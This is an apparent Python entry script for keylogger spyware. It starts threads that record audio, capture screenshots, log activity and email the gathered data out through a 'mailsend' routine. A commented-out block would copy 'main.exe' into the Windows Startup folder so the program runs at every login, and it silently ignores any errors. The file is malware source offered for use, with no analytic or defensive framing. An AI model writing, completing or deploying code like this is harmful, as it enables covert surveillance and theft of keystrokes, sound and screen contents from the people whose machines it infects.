
from keyloggerskill import keylogger
import time
import threading
from keystroke import main


"""
import shutil
import os

name = os.getlogin()


try:
    target = "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(name)

    shutil.copy('main.exe', target)
    
except:
    pass
"""

keyloggerobject = keylogger()
t = threading.Thread(target=keyloggerobject.take_sound)
t2 = threading.Thread(target=keyloggerobject.screenshootgo)
t3 = threading.Thread(target=keyloggerobject.log_time)
t4 = threading.Thread(target=keyloggerobject.mailsend)




t.start()
t2.start()
t3.start()
t4.start()
